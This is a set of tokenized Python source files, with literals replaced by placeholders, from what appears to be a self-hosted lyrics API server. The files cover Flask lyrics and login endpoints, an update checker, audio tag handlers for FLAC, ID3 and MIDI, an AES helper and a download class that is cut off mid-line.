<s> import requests <EOL> import logging <EOL> import threading <EOL> logger = logging . getLogger ( __name__ ) <EOL> def get_version ( ) : <EOL> api = "<STR_LIT>" <EOL> data = requests . get ( api ) . json ( ) <EOL> version = data [ '<STR_LIT>' ] [ <NUM_LIT> ] <EOL> return version <EOL> def version_upper ( latest : str , app_version : str ) -> bool : <EOL> v1 = tuple ( map ( int , latest . split ( '<STR_LIT>' ) ) ) <EOL> v2 = tuple ( map ( int , app_version . split ( '<STR_LIT>' ) ) ) <EOL> for i in range ( <NUM_LIT> ) : <EOL> if v1 [ i ] > v2 [ i ] : <EOL> return True <EOL> elif v1 [ i ] < v2 [ i ] : <EOL> return False <EOL> def check_update ( version ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> try : <EOL> latest_version = get_version ( ) <EOL> if version_upper ( latest_version , version ) : <EOL> logger . info ( f"<STR_LIT>" ) <EOL> return latest_version <EOL> else : <EOL> logger . info ( "<STR_LIT>" ) <EOL> return False <EOL> except : <EOL> logger . warning ( "<STR_LIT>" ) <EOL> return False <EOL> def run ( version ) : <EOL> t = threading . Thread ( target = check_update , args = ( version , ) ) <EOL> t . start ( ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run ( "<STR_LIT>" ) <EOL> input ( "<STR_LIT>" ) <EOL> </s>
<s> from . import * <EOL> import os <EOL> import concurrent . futures <EOL> from flask import request , abort , jsonify , render_template_string <EOL> from urllib . parse import unquote_plus <EOL> from mod import search , lrc <EOL> from mod import searchx <EOL> from mod import tools <EOL> from mod import tag <EOL> from mod . auth import webui <EOL> from mod . auth . authentication import require_auth <EOL> def read_file_with_encoding ( file_path , encodings ) : <EOL> for encoding in encodings : <EOL> try : <EOL> with open ( file_path , '<STR_LIT>' , encoding = encoding ) as f : <EOL> return f . read ( ) <EOL> except UnicodeDecodeError : <EOL> continue <EOL> return None <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ cache . cached ( timeout = <NUM_LIT> , key_prefix = make_cache_key ) <EOL> def lyrics ( ) : <EOL> match require_auth ( request = request ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> if not bool ( request . args ) : <EOL> abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> path = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> if path : <EOL> lrc_path = os . path . splitext ( path ) [ <NUM_LIT> ] + '<STR_LIT>' <EOL> if os . path . isfile ( lrc_path ) : <EOL> file_content = read_file_with_encoding ( lrc_path , [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> if file_content is not None : <EOL> return lrc . standard ( file_content ) <EOL> try : <EOL> lrc_in = tag . read ( path ) . get ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> if type ( lrc_in ) is str and len ( lrc_in ) > <NUM_LIT> : <EOL> return lrc_in <EOL> except : <EOL> pass <EOL> try : <EOL> title = unquote_plus ( request . args . get ( '<STR_LIT>' ) ) <EOL> artist = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> album = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> result : list = searchx . search_all ( title = title , artist = artist , album = album , timeout = <NUM_LIT> ) <EOL> if not result [ <NUM_LIT> ] . get ( '<STR_LIT>' ) : <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> return result [ <NUM_LIT> ] . get ( '<STR_LIT>' ) <EOL> except : <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ v1_bp . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> @ cache . cached ( timeout = <NUM_LIT> , key_prefix = make_cache_key ) <EOL> def lrc_json ( ) : <EOL> match require_auth ( request = request ) : <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> case - <NUM_LIT> : <EOL> return render_template_string ( webui . error ( ) ) , <NUM_LIT> <EOL> if not bool ( request . args ) : <EOL> abort ( <NUM_LIT> , "<STR_LIT>" ) <EOL> path = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> title = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> artist = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> album = unquote_plus ( request . args . get ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> response = [ ] <EOL> if path : <EOL> lrc_path = os . path . splitext ( path ) [ <NUM_LIT> ] + '<STR_LIT>' <EOL> if os . path . isfile ( lrc_path ) : <EOL> file_content = read_file_with_encoding ( lrc_path , [ '<STR_LIT>' , '<STR_LIT>' ] ) <EOL> if file_content is not None : <EOL> file_content = lrc . standard ( file_content ) <EOL> response . append ( { <EOL> "<STR_LIT>" : tools . calculate_md5 ( file_content ) , <EOL> "<STR_LIT>" : title , <EOL> "<STR_LIT>" : artist , <EOL> "<STR_LIT>" : file_content <EOL> } ) <EOL> lyrics_list = searchx . search_all ( title , artist , album ) <EOL> if lyrics_list : <EOL> for i in lyrics_list : <EOL> if not i : <EOL> continue <EOL> i [ '<STR_LIT>' ] = lrc . standard ( i [ '<STR_LIT>' ] ) <EOL> response . append ( i ) <EOL> _response = jsonify ( response ) <EOL> _response . headers [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> return jsonify ( response ) <EOL> </s>
<s> from . import * <EOL> from flask import request , redirect , jsonify , render_template_string , make_response <EOL> from mod . auth import webui , cookie <EOL> from mod . auth . authentication import require_auth <EOL> from mod . args import GlobalArgs <EOL> args = GlobalArgs ( ) <EOL> @ app . route ( '<STR_LIT>' ) <EOL> def login_check ( ) : <EOL> if require_auth ( request = request ) < <NUM_LIT> and args . auth : <EOL> return render_template_string ( webui . html_login ( ) ) <EOL> return redirect ( '<STR_LIT>' ) <EOL> @ app . route ( '<STR_LIT>' , methods = [ '<STR_LIT>' ] ) <EOL> def login_api ( ) : <EOL> data = request . get_json ( ) <EOL> if '<STR_LIT>' in data : <EOL> pwd = data [ '<STR_LIT>' ] <EOL> if args . valid ( pwd ) : <EOL> logger . info ( "<STR_LIT>" ) <EOL> response = make_response ( jsonify ( success = True ) ) <EOL> response . set_cookie ( '<STR_LIT>' , cookie . set_cookie ( pwd ) ) <EOL> return response <EOL> return jsonify ( success = False ) <EOL> </s>
<s> import base64 <EOL> import mutagen . flac <EOL> from . import util <EOL> from . file import Artwork , AudioFile , MetadataItem , TAG_MAP_ENTRY <EOL> def get_pictures ( afile , norm_key ) : <EOL> artworks = [ Artwork ( p . data , width = p . width , height = p . height , <EOL> fmt = p . mime . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] , pic_type = p . type ) <EOL> for p in afile . mfile . pictures ] <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_pictures ( afile , norm_key , artworks ) : <EOL> if not isinstance ( artworks , MetadataItem ) : <EOL> raise TypeError ( ) <EOL> afile . mfile . clear_pictures ( ) <EOL> for i , art in enumerate ( artworks . values ) : <EOL> if any ( v is None for v in ( art . mime , art . width , art . height , art . depth ) ) : <EOL> raise ImportError ( "<STR_LIT>" ) <EOL> pic = mutagen . flac . Picture ( ) <EOL> pic . data = art . raw <EOL> pic . type = art . pic_type <EOL> pic . mime = art . mime <EOL> pic . width = art . width <EOL> pic . height = art . height <EOL> pic . depth = art . depth <EOL> afile . mfile . add_picture ( pic ) <EOL> def rm_pictures ( afile , norm_key ) : <EOL> afile . mfile . clear_pictures ( ) <EOL> class FlacFile ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . flac . FLAC <EOL> _TAG_MAP = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = int , sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> remover = rm_pictures , <EOL> type = Artwork ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> } <EOL> def _ft_setter ( self , key , md_val , appendable = True ) : <EOL> if self . appendable and appendable : <EOL> self . mfile . tags [ key ] = [ str ( v ) for v in md_val . values ] <EOL> else : <EOL> self . mfile . tags [ key ] = str ( md_val . value ) <EOL> </s>
<s> import mutagen . smf <EOL> from . file import AudioFile <EOL> class SmfFile ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . smf . SMF <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> raise NotImplementedError ( "<STR_LIT>" ) <EOL> </s>
<s> import pyaes <EOL> class Crypto : <EOL> def __init__ ( self ) : <EOL> self . key = self . gen_key ( ) <EOL> @ staticmethod <EOL> def gen_key ( ) -> str : <EOL> import random <EOL> import string <EOL> aes_key : str = '<STR_LIT>' . join ( random . choices ( string . ascii_letters + string . digits , k = <NUM_LIT> ) ) <EOL> return aes_key <EOL> def encrypt ( self , data : str ) -> str : <EOL> aes = pyaes . AESModeOfOperationCTR ( self . key . encode ( ) ) <EOL> return aes . encrypt ( data ) . hex ( ) <EOL> def decrypt ( self , data : str ) -> str : <EOL> aes = pyaes . AESModeOfOperationCTR ( self . key . encode ( ) ) <EOL> return aes . decrypt ( bytes . fromhex ( data ) ) . decode ( ) <EOL> def change_key ( self ) : <EOL> self . key = self . gen_key ( ) <EOL> crypto = Crypto ( ) <EOL> </s>
<s> import logging <EOL> import sys <EOL> from waitress import serve <EOL> from mod import check_update <EOL> from mod . args import GlobalArgs <EOL> from mod . dev . debugger import debugger <EOL> from api import * <EOL> from api import __import__ <EOL> args = GlobalArgs ( ) <EOL> def run_server ( debug = False ) : <EOL> if not debug : <EOL> serve ( app , host = args . ip , port = args . port , threads = <NUM_LIT> , channel_timeout = <NUM_LIT> ) <EOL> else : <EOL> debugger . debug = True <EOL> debugger . log ( "<STR_LIT>" , "<STR_LIT>" ) <EOL> debugger . log ( "<STR_LIT>" , f"<STR_LIT>" ) <EOL> if args . auth : <EOL> debugger . log ( "<STR_LIT>" , f"<STR_LIT>" ) <EOL> app . run ( host = '<STR_LIT>' , port = args . port , debug = True ) <EOL> if __name__ == '<STR_LIT>' : <EOL> if sys . version_info < ( <NUM_LIT> , <NUM_LIT> ) : <EOL> raise RuntimeError ( <EOL> "<STR_LIT>" . format ( * sys . version_info [ : <NUM_LIT> ] ) <EOL> ) <EOL> logging . basicConfig ( level = logging . INFO , format = '<STR_LIT>' ) <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> logger . info ( "<STR_LIT>" ) <EOL> check_update . run ( version = args . version ) <EOL> app . register_blueprint ( v1_bp ) <EOL> run_server ( args . debug ) <EOL> </s>
<s> from . import cover , login , lyrics , source , tag , time , file <EOL> from . import waf <EOL> </s>
<s> import mutagen <EOL> import mutagen . id3 <EOL> import mutagen . easyid3 <EOL> import mutagen . mp3 <EOL> import mutagen . trueaudio <EOL> from . import util <EOL> from . file import Artwork , AudioFile , MetadataItem , TAG_MAP_ENTRY <EOL> def get_tracknumA ( afile , norm_key ) : <EOL> return util . get_easy_tracknum ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_tracknumA ( afile , norm_key , val ) : <EOL> return util . set_easy_tracknum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaltracksA ( afile , norm_key ) : <EOL> return util . get_easy_totaltracks ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaltracksA ( afile , norm_key , val ) : <EOL> return util . set_easy_totaltracks ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_discnumA ( afile , norm_key ) : <EOL> return util . get_easy_discnum ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_discnumA ( afile , norm_key , val ) : <EOL> return util . set_easy_discnum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaldiscsA ( afile , norm_key ) : <EOL> return util . get_easy_totaldiscs ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaldiscsA ( afile , norm_key , val ) : <EOL> return util . set_easy_totaldiscs ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_tracknumB ( afile , norm_key ) : <EOL> return util . get_easy_tracknum ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_tracknumB ( afile , norm_key , val ) : <EOL> return util . set_easy_tracknum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaltracksB ( afile , norm_key ) : <EOL> return util . get_easy_totaltracks ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaltracksB ( afile , norm_key , val ) : <EOL> return util . set_easy_totaltracks ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_discnumB ( afile , norm_key ) : <EOL> return util . get_easy_discnum ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_discnumB ( afile , norm_key , val ) : <EOL> return util . set_easy_discnum ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_totaldiscsB ( afile , norm_key ) : <EOL> return util . get_easy_totaldiscs ( afile , norm_key , _tag_name = '<STR_LIT>' ) <EOL> def set_totaldiscsB ( afile , norm_key , val ) : <EOL> return util . set_easy_totaldiscs ( afile , norm_key , val , _tag_name = '<STR_LIT>' ) <EOL> def get_pictures ( afile , norm_key ) : <EOL> pics = afile . mfile . tags . getall ( '<STR_LIT>' ) + afile . mfile . tags . getall ( '<STR_LIT>' ) <EOL> artworks = [ ] <EOL> for p in pics : <EOL> artworks . append ( Artwork ( p . data , pic_type = p . type ) ) <EOL> return MetadataItem ( Artwork , None , artworks ) <EOL> def set_pictures ( afile , norm_key , artworks ) : <EOL> if afile . mfile . tags . getall ( '<STR_LIT>' ) : <EOL> kls = mutagen . id3 . APIC <EOL> elif afile . mfile . tags . getall ( '<STR_LIT>' ) : <EOL> kls = mutagen . id3 . PIC <EOL> else : <EOL> if afile . mfile . tags . version [ : <NUM_LIT> ] == ( <NUM_LIT> , <NUM_LIT> ) : <EOL> kls = mutagen . id3 . PIC <EOL> else : <EOL> kls = mutagen . id3 . APIC <EOL> tag = str ( kls . __name__ ) . strip ( '<STR_LIT>' ) <EOL> afile . mfile . tags . delall ( tag ) <EOL> for i , art in enumerate ( artworks . values ) : <EOL> if kls == mutagen . id3 . PIC : <EOL> mime = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } [ art . mime . lower ( ) ] <EOL> else : <EOL> mime = art . mime <EOL> afile . mfile . tags . add ( kls ( data = art . raw , type = art . pic_type , desc = str ( i ) , <EOL> mime = mime ) ) <EOL> _TAG_MAP_ID3_1 = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> } <EOL> _TAG_MAP_ID3_2_2 = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_tracknumA , <EOL> setter = set_tracknumA , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaltracksA , <EOL> setter = set_totaltracksA , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_discnumA , <EOL> setter = set_discnumA , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaldiscsA , <EOL> setter = set_totaldiscsA , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> type = Artwork ) , <EOL> } <EOL> _TAG_MAP_ID3_2_3 = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_tracknumB , <EOL> setter = set_tracknumB , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaltracksB , <EOL> setter = set_totaltracksB , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_discnumB , <EOL> setter = set_discnumB , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaldiscsB , <EOL> setter = set_totaldiscsB , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> type = Artwork ) , <EOL> } <EOL> _TAG_MAP_ID3_2_4 = { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_tracknumB , <EOL> setter = set_tracknumB , <EOL> remover = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaltracksB , <EOL> setter = set_totaltracksB , <EOL> remover = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_discnumB , <EOL> setter = set_discnumB , <EOL> remover = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_totaldiscsB , <EOL> setter = set_totaldiscsB , <EOL> remover = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> setter = ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = int , sanitizer = util . sanitize_year ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = '<STR_LIT>' , setter = '<STR_LIT>' , type = int , <EOL> sanitizer = util . sanitize_bool ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = get_pictures , setter = set_pictures , <EOL> remover = ( '<STR_LIT>' , '<STR_LIT>' ) , <EOL> type = Artwork ) , <EOL> } <EOL> class Id3File ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . id3 . ID3FileType <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> mfile = kwargs . get ( '<STR_LIT>' , None ) <EOL> if mfile is None : <EOL> mfile = mutagen . File ( filename ) <EOL> kwargs [ '<STR_LIT>' ] = mfile <EOL> if mfile . tags : <EOL> id3_ver = mfile . tags . version [ : <NUM_LIT> ] <EOL> else : <EOL> id3_ver = ( <NUM_LIT> , <NUM_LIT> ) <EOL> if id3_ver [ <NUM_LIT> ] == <NUM_LIT> : <EOL> self . _TAG_MAP = _TAG_MAP_ID3_2_4 <EOL> elif id3_ver == ( <NUM_LIT> , <NUM_LIT> ) : <EOL> self . _TAG_MAP = _TAG_MAP_ID3_2_4 <EOL> elif id3_ver == ( <NUM_LIT> , <NUM_LIT> ) : <EOL> self . _TAG_MAP = _TAG_MAP_ID3_2_4 <EOL> elif id3_ver == ( <NUM_LIT> , <NUM_LIT> ) : <EOL> self . _TAG_MAP = _TAG_MAP_ID3_2_4 <EOL> else : <EOL> raise NotImplementedError ( "<STR_LIT>" <EOL> "<STR_LIT>" . format ( mfile . tags . version ) ) <EOL> super ( Id3File , self ) . __init__ ( filename , ** kwargs ) <EOL> def _ft_getter ( self , key ) : <EOL> vals = self . mfile . tags . getall ( key ) <EOL> ret = [ ] <EOL> for val in vals : <EOL> if isinstance ( val . text , ( list , tuple ) ) : <EOL> ret += [ str ( t ) for t in val . text ] <EOL> else : <EOL> ret += [ str ( val . text ) ] <EOL> if not ret : <EOL> ret = None <EOL> return ret <EOL> def _ft_setter ( self , key , md_val , appendable = True ) : <EOL> self . mfile . tags . delall ( key ) <EOL> kls = getattr ( mutagen . id3 , key . split ( '<STR_LIT>' ) [ <NUM_LIT> ] ) <EOL> kwargs = { } <EOL> _o = kls ( ) <EOL> if hasattr ( _o , '<STR_LIT>' ) : <EOL> kwargs [ '<STR_LIT>' ] = '<STR_LIT>' <EOL> self . mfile . tags . add ( kls ( text = str ( md_val ) , ** kwargs ) ) <EOL> def _ft_rmtag ( self , key ) : <EOL> self . mfile . tags . delall ( key ) <EOL> class Mp3File ( Id3File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . mp3 . MP3 <EOL> def __init__ ( self , filename , ** kwargs ) : <EOL> super ( Mp3File , self ) . __init__ ( filename , ** kwargs ) <EOL> self . tag_map = self . tag_map . copy ( ) <EOL> self . tag_map . update ( { <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : '<STR_LIT>' , <EOL> type = str ) , <EOL> '<STR_LIT>' : TAG_MAP_ENTRY ( getter = lambda afile , norm_key : None , <EOL> type = int ) , <EOL> } ) <EOL> class EasyMp3File ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . mp3 . EasyMP3 <EOL> class EasyId3File ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . easyid3 . EasyID3FileType <EOL> class TrueAudioFile ( Id3File ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . trueaudio . TrueAudio <EOL> class EasyTrueAudioFile ( AudioFile ) : <EOL> tag_format = "<STR_LIT>" <EOL> mutagen_kls = mutagen . trueaudio . EasyTrueAudio <EOL> </s>
<s> import hashlib <EOL> from mod . auth import webui <EOL> from mod . auth . authentication import require_auth <EOL> from . import * <EOL> import os <EOL> import requests <EOL> from urllib . parse import urlparse <EOL> from flask import request , render_template_string , send_from_directory <EOL> from werkzeug . utils import secure_filename <EOL> from mod . tools import calculate_md5 <EOL> class Wget : <EOL> def __init__ ( self , url : str , headers : dict = None , save_file : str = None , chunk_size : int = <NUM_LIT> * <NUM_LIT> ) : <EOL> self . url = url <EOL> self . headers = headers or { '<STR_LIT>' : '<STR_LIT>' } <EOL> self . save_file = save_file or os . path . join ( os . getcwd ( ) , os . path . basename ( urlparse ( url ) . path ) ) <EOL> self . chunk_size = chunk_size <EOL> self . temp_file = calculate_md5 ( self . url ) + '<STR_LIT>' <EOL> def __enter__ ( self ) : <EOL> self . file = open ( self . temp_file , '<STR_LIT>' ) <EOL> return self <EOL> def __exit__ ( self , exc_type , exc_val , exc_tb ) : <EOL> self . file . close ( ) <EOL> if exc_type is not None : <EOL> os . remove ( self . temp_file ) <EOL> else : <EOL> os . rename ( self . temp_file , self . save_file ) <EOL> def download ( self ) : <EOL> response = requests . get 